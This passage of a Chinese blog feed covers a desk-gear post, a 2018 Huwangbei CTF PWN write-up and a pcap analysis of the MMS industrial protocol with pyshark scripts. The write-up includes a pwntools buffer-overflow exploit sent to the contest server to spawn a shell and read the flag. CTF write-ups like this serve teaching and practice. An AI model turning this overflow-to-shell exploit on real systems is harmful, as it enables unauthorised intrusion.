    <content type="html"><![CDATA[<p>每天回到寝室就是面对着这小小的工作台，因此我个人十分乐意打造一个美观实用的个性桌面，下面我来介绍一下我的桌面</p><h2 id="0x00显示器"><a href="#0x00显示器" class="headerlink" title="0x00显示器"></a>0x00显示器</h2><p>显示器📺是一台AOC的显示器，分辨率为2560x1440，尺寸为24寸，说实话这个分辨率和尺寸的显示器并不好找，一般来说市面上上了2K分辨率的显示器的尺寸都是27寸+，而这台显示器尺寸适中，2K的分辨率在这个高分辨率显示器普及缓慢的大背景下依然能在未来几年内保持在主流水平，高DPI也着实带来了不错的观感，显示相比1080P的屏幕要细腻不少，高色域的显示效果也十分优秀，在正常的使用场景下，其显示效果甚至能带来类似Macbook的retina屏的显示效果，算是性价比挺高的一台显示器了。</p><span id="more"></span><p>为了减少夜晚熄灯后带来的显示器的高光对眼睛造成伤害，我买了一条灯带用于缓解显示器与背景墙的亮度差异，并围绕灯光氛围设计了几个不同的主题：</p><p><strong>深空</strong>🌌</p><p><img src="https://i.loli.net/2018/10/16/5bc603d713cdc.jpg"></p><p><strong>败家之眼ROG</strong>🔥</p><p><img src="https://i.loli.net/2018/10/16/5bc603d84cab5.jpg"></p><p><strong>雷蛇</strong>🐍</p><p><img src="https://i.loli.net/2018/10/16/5bc603da08e5e.jpg"></p><p><strong>极光</strong>🌠</p><p><img src="https://i.loli.net/2018/10/16/5bc603dc0d490.jpg"></p><p><strong>粉色Nier</strong>💟</p><p><img src="https://i.loli.net/2018/10/16/5bc603dd19d90.jpg"></p><p>动态桌面采用<code>Wallpaper Engine</code>，以下为动态桌面显示效果，<code>Gif</code>格式下颜色有些失真(+_+)?</p><p><strong>雷蛇RGB🌈</strong></p><p><img src="https://raw.githubusercontent.com/Hvnt3r/My_Images/master/faceu_20181016220058.gif"></p><p><strong>冬雪💧</strong></p><p><img src="https://raw.githubusercontent.com/Hvnt3r/My_Images/master/faceu_20181016215814.gif"></p><h2 id="0x01键盘⌨"><a href="#0x01键盘⌨" class="headerlink" title="0x01键盘⌨"></a>0x01键盘⌨</h2><p>目前有两个键盘</p><p>1.<strong>狼蛛 茶轴 104键</strong></p><p>这把键盘主要用来打游戏，用习惯青轴之后再用茶轴会觉得茶轴手感偏肉，但是响应还是不错的</p><p><img src="https://i.loli.net/2018/10/17/5bc60c843e3a6.jpg"></p><p>2.<strong>iQunix F60 青轴</strong></p><p>这把键盘颜值在线，手感极佳，码字十分舒服</p><p><img src="https://i.loli.net/2018/10/17/5bc60bc1ae91f.jpg"></p><h2 id="0x02鼠标🖱"><a href="#0x02鼠标🖱" class="headerlink" title="0x02鼠标🖱"></a>0x02鼠标🖱</h2><p>鼠标是罗技G402，此型号被同系列的G502和G902的光辉所淹没，很多人吐槽这个鼠标的光学传感器与产品定位不符，但是我这种不是太挑剔的用着这个号称是全球最快的鼠标也并没有感觉到这个鼠标真的跟大佬所说一样不好，反而形状很贴合手掌，重量适中相比G502多了一丝灵动飘逸的曲线，少了一些笨重的侧键，感觉还是十分不错的。🌊</p><p><img src="https://i.loli.net/2018/10/17/5bc60c203a9d4.jpg"></p><h2 id="0x03耳机🎧"><a href="#0x03耳机🎧" class="headerlink" title="0x03耳机🎧"></a>0x03耳机🎧</h2><p>耳机是雷蛇的北海巨妖Pro v7.1，韦神、冯提莫、周淑怡等众多主播的同款，此耳机主打游戏特色，有专用的驱动营造虚拟7.1声道，实际体验下来效果确实不错，玩吃鸡或者CSGO的时候确实感觉声音的立体感挺足，经常就是跟着声音的方向一个猛然拉枪就瞄到了敌人的头上（低调低调），听音乐时效果还行，小伙伴试听之后说觉得我这个耳机的音质比他2000多的耳机的音质还好，可能是每个人对音色的喜好不同吧，这个耳机低频出色而不轰头，因此在欣赏电音的时候体验极佳，但是在听古典音乐或者纯净女声时声音并没有特别的清澈通透，总之我觉得这个耳机还不错。灯厂的RGB果然名不虚传，耳机两侧的logo亮起时颜色十分均匀，颜色过渡平和，灯效满分！👍</p><p><img src="https://i.loli.net/2018/10/17/5bc60c606daae.jpg"></p><h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>其实我的桌面上还有好多小玩意，没有介绍是因为我的手机拍暗景时噪点多的吓人，因此就不展示了，希望将来可以打造一个更加Geek的桌面！</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>桌面</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018护网杯PWN题解</title>
    <link href="/2018/10/2018%E6%8A%A4%E7%BD%91%E6%9D%AFPWN%E9%A2%98%E8%A7%A3/"/>
    <url>/2018/10/2018%E6%8A%A4%E7%BD%91%E6%9D%AFPWN%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>这次的护网杯大佬云集，可能很多企业是冲着工业互联网这个招牌去的但是初赛却是学生们玩的比较多的传统CTF。。</p><h2 id="gettingStart"><a href="#gettingStart" class="headerlink" title="gettingStart"></a>gettingStart</h2><p><img src="https://i.loli.net/2018/10/15/5bc3e66225eae.png"></p><p><a href="https://github.com/Hvnt3r/challenges/raw/master/CTF/2018/%E6%8A%A4%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/PWN/gettingStart/task_gettingStart_ktQeERc">题目下载地址</a></p><p>第一道PWN题还是很简单的，写到脸上的溢出，先看一下文件信息</p><span id="more"></span><p><img src="https://i.loli.net/2018/10/15/5bc3e6b8d011f.png"></p><p><img src="https://i.loli.net/2018/10/15/5bc3e7035e242.png"></p><p>64位的可执行ELF文件，且开启了NX和CANARY，放到IDA里看一下：</p><p><img src="https://i.loli.net/2018/10/15/5bc3e87b6d4e9.png"></p><p>可以在main函数里找到一些关键信息，程序的逻辑是<img src="https://i.loli.net/2018/10/15/5bc3e8dfe8923.png"></p><p>关键点在于这个<code>if</code>语句如果想执行else语句中的<code>system(&quot;/bin/sh&quot;);</code>，需要使得<code>v7</code>的值为<code>0x7FFFFFFFFFFFFFFFLL</code>且<code>v8</code> 的值为<code>0.1</code></p><p>而<code>v7</code>的值已经满足条件，但是<code>v8</code>的值需要我们修改，然后看到这里有一个<code>read</code>函数，此函数会从输入缓冲区中读取<code>28H</code>个字节到<code>buf</code>中，但根据如下信息可知</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 buf; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>__int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>__int64 v6; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>__int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><span class="hljs-type">double</span> v8; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br><span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br></code></pre></td></tr></table></figure><p>实际的<code>buf</code>的空间只有<code>30H-28H=8H</code>的大小，显然会溢出<code>40-8=32</code>个字节的大小，而我们的目的时修改<code>v8</code>的值，v8的值位于<code>[rbp-10h]~[rbp-8h]</code>内，因此我们需要构造<code>30H-18H=24</code>个字节的任意字符串填充v7前面的栈空间，并用<code>0x7FFFFFFFFFFFFFFFLL</code>填充<code>v7</code>，并用<code>0.1</code>在栈中的存储形式来填充v8即可达成条件从而执行<code>/bin/sh</code>我们需要搞清楚<code>double</code>型的<code>0.1</code>在内存中时如何存储的，<a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double">参考链接</a>,如果不知道其实可以直接自己写一个c程序然后调试一下得到，比如如下c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">double</span> v1=<span class="hljs-number">0.1</span>;<br><span class="hljs-type">double</span> v2;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>,&amp;v2);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f,%f&quot;</span>,v1,v2);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>gcc</code>编译一下再用<code>gdb</code>观察栈中的数据变化即可得到，题目所给的程序的<code>data</code>段中也可以直接找到</p><p><img src="https://i.loli.net/2018/10/15/5bc40746c46bd.png"></p><p>因此可得<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&quot;./task_gettingStart_ktQeERc&quot;)</span><br>p=remote(<span class="hljs-string">&quot;117.78.26.12&quot;</span>,<span class="hljs-number">32117</span>)<br>payload=<span class="hljs-string">&quot;&quot;</span><br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="hljs-number">0x3FB999999999999A</span>)<br>cmd=<span class="hljs-string">&quot;cat flag\n&quot;</span><br><br><span class="hljs-built_in">print</span> p.recv()<br><span class="hljs-built_in">print</span> payload<br>p.send(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.send(cmd)<br>p.interactive()<br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>得到<code>flag</code>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">flag&#123;04e4ed5f40fa2c717f7a70ba74be2887&#125;<br></code></pre></td></tr></table></figure><h2 id="shoppingCart"><a href="#shoppingCart" class="headerlink" title="shoppingCart"></a>shoppingCart</h2><p><a href="https://github.com/Hvnt3r/challenges/raw/master/CTF/2018/%E6%8A%A4%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/PWN/shoppingCart/task_shoppingCart">题目下载地址</a></p><p>to be done</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>2018护网杯</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>工业控制电力系统协议分析</title>
    <link href="/2018/10/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E7%94%B5%E5%8A%9B%E7%B3%BB%E7%BB%9F%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    <url>/2018/10/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E7%94%B5%E5%8A%9B%E7%B3%BB%E7%BB%9F%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>当前，随着中国制造2025战略深入推进，工业控制系统从单机走向互联、从封闭走向开放、从自动化走向智能化，安全漏洞和隐患不断涌现、安全事件频繁发生。我国面临的工业信息安全形势日益严峻。</p><p>暑假期间去参加工业信息安全技能大赛时遇到的一个工控协议分析题目，当时没接触过此类题目所以一脸懵逼没解出来，现在有时间拿出来回顾一下，记录下解题过程。</p><span id="more"></span><p>题面：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">智能变电站通过61850规约进行监控层到间隔层的数据采集，请分析网络数据包，了解mms规约，进一步发现数据中隐藏的flag<br></code></pre></td></tr></table></figure><p><a href="https://github.com/Hvnt3r/challenges/raw/master/CTF/2018/Industrial%20information%20security%20skills%20competition/%E7%94%B5%E5%8A%9B%E7%B3%BB%E7%BB%9F%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90.pcap">点我下载题目</a></p><p><strong>解题思路</strong></p><p>打开数据包，根据题目中所说的“了解MMS规约”可知此题考查的重点是mms协议，因此先排除其他协议的干扰，从数据包中筛选出mms协议的数据包</p><p><img src="https://i.loli.net/2018/10/08/5bbb4cc736b15.png"></p><p>共8158个数据包，过滤出1538个mms协议的数据包，观察info栏发现此协议主要含有4个协议数据单元(<code>PDU</code>)，分别为</p><table><thead><tr><th>English name</th><th>中文名称</th></tr></thead><tbody><tr><td>initiate-RequestsPDU</td><td>启动-请求PDU</td></tr><tr><td>initiate-ResponsePDU</td><td>启动-应答PDU</td></tr><tr><td>confirmed-RequestsPDU</td><td>确认-请求PDU</td></tr><tr><td>confirmed-ResponsePDU</td><td>确认-应答PDU</td></tr></tbody></table><p>四个PDU中前两个PDU只有两个数据包，而且查看后找不到什么有价值的内容，所以flag应该是隐藏在后面两个PDU中了</p><p>突然回想起当时解题时一心想通过<code>ctrl+F</code>大法来查找携带flag字符串的内容，然后发现了一个名为flag.txt的文件，那么flag八成是在这个里面了，但是通过追踪流的方式找到的这个文件名貌似没有找到文件的内容而只有文件名</p><p><img src="https://i.loli.net/2018/10/08/5bbb5098404fa.png"></p><p>当时看到这个文件名就像看到了希望的曙光疯狂在这个字符串附近寻找<code>flag</code>，但是当时的比赛环境并没有提供网络，也并没有机会查阅<code>mms</code>协议相关的资料，于是就像没头苍蝇乱撞，结果一无所获。</p><p>另外说一句，其实对于这种数据包的分析题，有个很好的软件叫做<code>NetworkMiner</code>这个软件可以自动分析出数据包中存在的文件或者消息，<code>session维持</code>的信息等，可以说功能十分强大，关键是方便，不过可能这个软件不支持<code>mms</code>协议的分析，所以用这个软件找不到<code>flag.txt</code>的内容。</p><p>对于这种大数据量的数据包，可以使用<code>pyshark</code>进行分析，我在这个网站上找到了很好的<code>pyshark</code>的教程，<a href="http://zodiacg.net/2016/07/intro2pyshark-ep1/">我是链接</a> ，文章中对<code>pyshark</code>有详细的介绍，很多用法可以在里面查到，另外在这个<a href="http://zodiacg.net/2016/07/intro2pyshark-ep4/">链接</a>里有数据包摘要的介绍，在对数据包进行过滤的时候可以用到，我们可以使用类似如下的方法来获取对象的一些关键信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_service</span>():<br>    <span class="hljs-keyword">try</span>:<br>        captures = pyshark.FileCapture(<span class="hljs-string">&quot;test.pcap&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(captures[<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_service()<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;__contains__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__dict__&#x27;</span>, <span class="hljs-string">&#x27;__dir__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>, <span class="hljs-string">&#x27;__ge__&#x27;</span>, <span class="hljs-string">&#x27;__getattr__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__getstate__&#x27;</span>, <span class="hljs-string">&#x27;__gt__&#x27;</span>, <span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;__init_subclass__&#x27;</span>, <span class="hljs-string">&#x27;__le__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__module__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>, <span class="hljs-string">&#x27;__new__&#x27;</span>, <span class="hljs-string">&#x27;__reduce__&#x27;</span>, <span class="hljs-string">&#x27;__reduce_ex__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>, <span class="hljs-string">&#x27;__setattr__&#x27;</span>, <span class="hljs-string">&#x27;__setstate__&#x27;</span>, <span class="hljs-string">&#x27;__sizeof__&#x27;</span>, <span class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__subclasshook__&#x27;</span>, <span class="hljs-string">&#x27;__weakref__&#x27;</span>, <span class="hljs-string">&#x27;_packet_string&#x27;</span>, <span class="hljs-string">&#x27;captured_length&#x27;</span>, <span class="hljs-string">&#x27;cotp&#x27;</span>, <span class="hljs-string">&#x27;eth&#x27;</span>, <span class="hljs-string">&#x27;frame_info&#x27;</span>, <span class="hljs-string">&#x27;get_multiple_layers&#x27;</span>, <span class="hljs-string">&#x27;get_raw_packet&#x27;</span>, <span class="hljs-string">&#x27;highest_layer&#x27;</span>, <span class="hljs-string">&#x27;interface_captured&#x27;</span>, <span class="hljs-string">&#x27;ip&#x27;</span>, <span class="hljs-string">&#x27;layers&#x27;</span>, <span class="hljs-string">&#x27;length&#x27;</span>, <span class="hljs-string">&#x27;number&#x27;</span>, <span class="hljs-string">&#x27;pres&#x27;</span>, <span class="hljs-string">&#x27;pretty_print&#x27;</span>, <span class="hljs-string">&#x27;ses&#x27;</span>, <span class="hljs-string">&#x27;ses&#x27;</span>, <span class="hljs-string">&#x27;show&#x27;</span>, <span class="hljs-string">&#x27;sniff_time&#x27;</span>, <span class="hljs-string">&#x27;sniff_timestamp&#x27;</span>, <span class="hljs-string">&#x27;tcp&#x27;</span>, <span class="hljs-string">&#x27;tpkt&#x27;</span>, <span class="hljs-string">&#x27;transport_layer&#x27;</span>]<br></code></pre></td></tr></table></figure><p>也可以直接在<code>Pycharm</code>里按<code>tab</code>键查看</p><p><img src="https://i.loli.net/2018/10/09/5bbc16fd9b86f.png"></p><p>通过此方法来确定我们要找的信息，写出脚本来统计数据包中MMS的服务个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_service</span>():<br>    <span class="hljs-keyword">try</span>:<br>        captures = pyshark.FileCapture(<span class="hljs-string">&quot;test.pcap&quot;</span>)<br>        confirmed_services_request = &#123;&#125;<br>        confirmed_services_response = &#123;&#125;<br>        <span class="hljs-keyword">for</span> capture <span class="hljs-keyword">in</span> captures:<br>            <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> capture:<br>                <span class="hljs-keyword">if</span> pkt.layer_name == <span class="hljs-string">&quot;mms&quot;</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;confirmedservicerequest&quot;</span>):<br>                        service = pkt.confirmedservicerequest<br>                        <span class="hljs-keyword">if</span> service <span class="hljs-keyword">in</span> confirmed_services_request:<br>                            confirmed_services_request[service] += <span class="hljs-number">1</span><br>                        <span class="hljs-keyword">else</span>:<br>                            confirmed_services_request[service] = <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;confirmedserviceresponse&quot;</span>):<br>                        service = pkt.confirmedserviceresponse<br>                        <span class="hljs-keyword">if</span> service <span class="hljs-keyword">in</span> confirmed_services_response:<br>                            confirmed_services_response[service] += <span class="hljs-number">1</span><br>                        <span class="hljs-keyword">else</span>:<br>                            confirmed_services_response[service] = <span class="hljs-number">1</span><br>        <span class="hljs-comment"># print</span><br>        <span class="hljs-built_in">print</span>(confirmed_services_request)<br>        <span class="hljs-built_in">print</span>(confirmed_services_response)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_service()<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;<span class="hljs-number">77</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">4</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">17</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">12</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">26</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">6</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">211</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">72</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">72</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">351</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">73</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">44</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">74</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">9</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">5</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span>&#x27;<span class="hljs-number">77</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">4</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">17</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">12</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">26</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">6</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">211</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">72</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">72</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">351</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">73</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">44</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">74</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">9</span><span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">5</span>&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">32</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>发现数据包中使用到了9个服务，分别是<code>1 (getNameList)</code>、<code>4 (read)</code>、<code>5 (write)</code>、<code>6 (getVariableAccessAttributes)</code>、<code>12 (getNamedVariableListAttributes)</code>、<code>72 (fileOpen)</code>、<code>73 (fileRead)</code>、<code>74 (fileClose)</code>、<code>77 (fileDirectory)</code></p><blockquote><p>关于协议类型，可以参考文件<a href="https://github.com/Hvnt3r/My_Images/raw/master/GBT16720.2-2005_%E5%B7%A5%E4%B8%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E7%B3%BB%E7%BB%9F_%E5%88%B6%E9%80%A0%E6%8A%A5%E6%96%87%E8%A7%84%E8%8C%83_%E7%AC%AC2%E9%83%A8%E5%88%86_%E5%8D%8F%E8%AE%AE%E8%A7%84%E8%8C%83.pdf">GBT16720.2-2005_工业自动化系统_制造报文规范_第2部分_协议规范.pdf</a></p></blockquote><p>结合之前找到的<code>flag.txt</code>，过滤一下：</p><p><img src="https://i.loli.net/2018/10/15/5bc451c3330e0.png"></p><p>找到了读取flag.txt的数据包，因而编写如下脚本找出读取的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">try</span>:<br>        captures = pyshark.FileCapture(<span class="hljs-string">&quot;test.pcap&quot;</span>)<br>        flag_frsm = <span class="hljs-literal">False</span><br>        flag_frsm_id = <span class="hljs-literal">None</span><br>        flag_read = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> capture <span class="hljs-keyword">in</span> captures:<br>            <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> capture:<br>                <span class="hljs-keyword">if</span> pkt.layer_name == <span class="hljs-string">&quot;mms&quot;</span>:<br>                    <span class="hljs-comment"># file open</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;confirmedservicerequest&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(pkt.confirmedservicerequest) == <span class="hljs-number">72</span>:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;filename_item&quot;</span>):<br>                            filename_items = pkt.filename_item.fields<br>                            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> filename_items:<br>                                file_name = <span class="hljs-built_in">str</span>(f.get_default_value())<br>                                <span class="hljs-keyword">if</span> file_name == <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>                                    flag_frsm = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;confirmedserviceresponse&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(pkt.confirmedserviceresponse) == <span class="hljs-number">72</span> <span class="hljs-keyword">and</span> flag_frsm:<br>                        <span class="hljs-comment"># print(pkt.field_names)</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;frsmid&quot;</span>):<br>                            flag_frsm_id = pkt.frsmid<br>                        flag_frsm = <span class="hljs-literal">False</span><br>                    <span class="hljs-comment"># file read</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;confirmedservicerequest&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(pkt.confirmedservicerequest) == <span class="hljs-number">73</span> <span class="hljs-keyword">and</span> flag_frsm_id:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&quot;fileread&quot;</span>):<br>                            <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(pkt.fileread) == <span class="hljs-built_in">str</span>(flag_frsm_id):<br>                                flag_read = <span class="hljs-literal">True</span><br>                        